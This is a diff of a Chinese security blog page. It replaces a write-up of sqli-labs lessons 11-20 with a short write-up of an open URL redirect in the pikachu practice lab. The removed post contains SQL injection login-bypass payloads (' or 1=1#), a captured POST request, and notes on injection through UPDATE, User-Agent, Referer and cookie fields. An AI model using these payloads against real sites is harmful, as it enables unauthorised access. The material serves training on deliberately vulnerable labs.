@@ -22,7 +22,7 @@
 
   
 
-  <title>SQL注入-sqli-labs-less11-20 | Liv_binz的技术博客</title>
+  <title>pikachu靶场-不安全的URL重定向 | Liv_binz的技术博客</title>
 
   
 
@@ -90,20 +90,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">SQL注入-sqli-labs-less11-20</h1>
+          <h1 class="title-wrap">pikachu靶场-不安全的URL重定向</h1>
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-26T06:24:44.219Z" itemprop="datePublished">2022-01-26</time>
+            <time  class="article-date" datetime="2022-01-31T07:14:08.028Z" itemprop="datePublished">2022-01-31</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/sqli/">📒 sqli</a></li>
+    <li><a href="/categories/URL%E9%87%8D%E5%AE%9A%E5%90%91/">📒 URL重定向</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/sqli-labs/">🏷️ sqli-labs</a></li>
+    <li><a href="/tags/pikachu-write-up/">🏷️ pikachu; write up</a></li>
   
 </ul>
         </div>
@@ -127,238 +127,19 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="Sqli-labs-Less11"><a href="#Sqli-labs-Less11" class="headerlink" title="Sqli-labs Less11"></a>Sqli-labs Less11</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code>$uname=$_POST[&#39;uname&#39;];
-$passwd=$_POST[&#39;passwd&#39;];
-
-@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
-
-if true:
-    正常回显
-else:
-    print_r(mysql_error());
+        <p>页面如图：</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220131151511.png"></p>
+<p>测试后发现点击第三个超链接会重定向到<code>unsafere.php</code></p>
+<p>观察一下burp proxy里面的HTTP history</p>
+<p>看一下请求的status line，如下：</p>
+<pre><code>GET /vul/urlredirect/urlredirect.php?url=unsafere.php HTTP/1.1
 </code></pre>
-<ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=‘admin’</strong></li>
-<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
-</ol>
-<blockquote>
-<p>GET型和POST型</p>
-<p>注入点位置不同而已, 其他方法都是一样的</p>
-<p>不过POST稍微麻烦点 得加上个抓包的步骤</p>
-</blockquote>
-<p>输入 user:admin password:admin</p>
-<p>请求如下:</p>
-<pre><code>POST /Less-11/ HTTP/1.1
-Host: 127.0.0.1:4000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 38
-Origin: http://127.0.0.1:4000
-Connection: close
-Referer: http://127.0.0.1:4000/Less-11/
-Upgrade-Insecure-Requests: 1
-
-uname=admin&amp;passwd=admin&amp;submit=Submit
+<p>发现是在url里面传入的参数</p>
+<p>用百度来测试一下：</p>
+<pre><code>http://192.168.0.6:4001/vul/urlredirect/urlredirect.php?url=http://www.baidu.com
 </code></pre>
-<h2 id="登陆绕过"><a href="#登陆绕过" class="headerlink" title="登陆绕过"></a>登陆绕过</h2><p>这边包含一个最简单的登陆绕过知识点</p>
-<blockquote>
-<p>之前看大黑书WAHH的时候就学到过</p>
-<p>还做过portswigger自己靶场的一道题</p>
-<p>WAHH page 288-289</p>
-<p>lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">https://portswigger.net/web-security/sql-injection/lab-login-bypass</a></p>
-</blockquote>
-<p>看看源码就可以知道, 我们可以轻松地把password注释掉, 如下:</p>
-<pre><code>uname=admin&#39;#&amp;passwd=admin&amp;submit=Submit
-</code></pre>
-<blockquote>
-<p>不过要注意! data里面不能用+,所以不能用–+,这边可以用#来代替,也可以手动加空格</p>
-</blockquote>
-<p>但只有已知一个用户名的情况下可以做到, 如果不知道任何用户名呢?</p>
-<p><strong>OR</strong> 一个永真条件就是了, 如下:</p>
-<pre><code>uname=&#39; or 1=1#&amp;passwd=admin&amp;submit=Submit
-</code></pre>
-<p>此时返回的是全部字段,可以添加limit 0,1逐个偏移来换账户,如下:</p>
-<pre><code>uname=&#39; or 1=1 limit 0,1#&amp;passwd=admin&amp;submit=Submit
-回显:
-Your Login name:Dumb
-Your Password:Dumb
-
-uname=&#39; or 1=1 limit 1,1#&amp;passwd=admin&amp;submit=Submit
-回显:
-Your Login name:Angelina
-Your Password:I-kill-you
-</code></pre>
-<p>接下来联合、报错、布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less12"><a href="#Sqli-labs-Less12" class="headerlink" title="Sqli-labs Less12"></a>Sqli-labs Less12</h1><ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=(‘admin’)</strong></li>
-<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
-</ol>
-<p>与less-11相仿</p>
-<p>联合、报错、布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less13"><a href="#Sqli-labs-Less13" class="headerlink" title="Sqli-labs Less13"></a>Sqli-labs Less13</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><pre><code>$uname=$_POST[&#39;uname&#39;];
-$passwd=$_POST[&#39;passwd&#39;];
-
-@$sql=&quot;SELECT username, password FROM users WHERE username=(&#39;$uname&#39;) and password=(&#39;$passwd&#39;) LIMIT 0,1&quot;;
-
-if true:
-    没有回显
-else:
-    print_r(mysql_error());
-</code></pre>
-<ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=(‘admin’)</strong></li>
-<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
-</ol>
-<p>报错、布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less14"><a href="#Sqli-labs-Less14" class="headerlink" title="Sqli-labs Less14"></a>Sqli-labs Less14</h1><ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=”admin”</strong></li>
-<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
-</ol>
-<p>与less-13相仿</p>
-<p>报错、布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less15"><a href="#Sqli-labs-Less15" class="headerlink" title="Sqli-labs Less15"></a>Sqli-labs Less15</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><pre><code>$uname=$_POST[&#39;uname&#39;];
-$passwd=$_POST[&#39;passwd&#39;];
-
-@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
-
-if true:
-    正常回显
-else:
-    没有回显
-</code></pre>
-<ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=’admin’</strong></li>
-<li>注入类型— <strong>布尔盲注、延时</strong></li>
-</ol>
-<p>布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less16"><a href="#Sqli-labs-Less16" class="headerlink" title="Sqli-labs Less16"></a>Sqli-labs Less16</h1><ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=(“admin”)</strong></li>
-<li>注入类型— <strong>布尔盲注、延时</strong></li>
-</ol>
-<p>与less-15相仿</p>
-<p>布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less17"><a href="#Sqli-labs-Less17" class="headerlink" title="Sqli-labs Less17"></a>Sqli-labs Less17</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><pre><code>//making sure uname is not injectable
-$uname=check_input($_POST[&#39;uname&#39;]);  
-
-$passwd=$_POST[&#39;passwd&#39;];
-
-@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;
-
-if uname ture:
-    $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;
-    if error:
-        print_r(mysql_error());
-    else:
-        正常回显
-else:
-    bug off you silly dumb hacker
-</code></pre>
-<ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=’admin’</strong></li>
-<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
-</ol>
-<p>uname的输入被检查了,不可注入</p>
-<p>注入点在update语句</p>
-<p>报错、布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less18"><a href="#Sqli-labs-Less18" class="headerlink" title="Sqli-labs Less18"></a>Sqli-labs Less18</h1><h2 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h2><pre><code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
-$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];
-
-if 有uname和passwd输入:
-    $uname = check_input($_POST[&#39;uname&#39;]);
-    $passwd = check_input($_POST[&#39;passwd&#39;]);
-
-    $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
-
-    $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;
-
-    if true:
-        回显ua
-        print_r(mysql_error());
-    else
-        print_r(mysql_error());
-</code></pre>
-<ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=(‘admin’)</strong></li>
-<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
-</ol>
-<p>uname和passwd都被检查了,不可注入</p>
-<p>注入点在UA</p>
-<blockquote>
-<p>PHP 里用来获取客户端 IP 的变量</p>
-</blockquote>
-<blockquote>
-<p>$_SERVER[&#39;HTTP_CLIENT_IP&#39;] 这个很少使用，不一定服务器都实现了。客户端可以伪造。</p>
-<p>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] ，客户端可以伪造。</p>
-<p>$_SERVER[&#39;REMOTE_ADDR&#39;] ，客户端不能伪造</p>
-</blockquote>
-<p>报错、布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less19"><a href="#Sqli-labs-Less19" class="headerlink" title="Sqli-labs Less19"></a>Sqli-labs Less19</h1><h2 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h2><pre><code>$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];
-$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];
-
-if 输入了uname 和 passwd:
-    $uname = check_input($_POST[&#39;uname&#39;]);
-    $passwd = check_input($_POST[&#39;passwd&#39;]);
-
-    $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
-
-if true:
-    $insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;
-    回显referer
-    print_r(mysql_error());    
-else:
-    print_r(mysql_error());    
-</code></pre>
-<ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=’admin’</strong></li>
-<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
-</ol>
-<p>注入点在referer</p>
-<p>报错、布尔盲注、延时常规操作与less-1相同</p>
-<h1 id="Sqli-labs-Less20"><a href="#Sqli-labs-Less20" class="headerlink" title="Sqli-labs Less20"></a>Sqli-labs Less20</h1><h2 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h2><pre><code>if cookie 中不存在 uname 参数:  
-    回显一些东东
-    if 输入了uname 和 passwd:
-        $uname = check_input($_POST[&#39;uname&#39;]);
-        $passwd = check_input($_POST[&#39;passwd&#39;]);
-
-        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
-        $cookee = $row1[&#39;username&#39;];
-        if true:
-            # 将 uname 的值设置给 cookie 里面的 uname 参数
-            setcookie(&#39;uname&#39;, $cookee, time()+3600);
-        else:
-            print_r(mysql_error());
-
-else:
-    if POST 数据里面没有 submit 参数:
-        $cookee = $_COOKIE[&#39;uname&#39;];
-        $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;
-        if 报错:
-            输出 mysql_error()
-        if true:
-            正常回显
-    else:
-        # 将 uname 的值设置给 cookie 里面的 uname 参数
-        setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600);
-</code></pre>
-<ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>uname=’admin’</strong></li>
-<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
-</ol>
-<p>注入点在cookie</p>
-<p>联合、报错、布尔盲注、延时常规操作与less-1相同</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220131182252.png"></p>
+<p>跳转成功 漏洞存在^^</p>
 
       </section>
 
@@ -366,22 +147,6 @@ else:
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="/cover.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/01/28/http1/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">HTTP系列1-HTTP/0.9-HTTP/1.0</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -390,8 +155,8 @@ else:
     
     <div class="card-text">
       
-        <a href="/2022/01/25/sqli1/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">SQL注入-sqli-labs-less1-10</h2>
+        <a href="/2022/01/31/pikachu1/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">pikachu靶场-SQLI-数字型注入（POST）</h2>
         </a>
       
       <div class="card-text--row">Older</div>
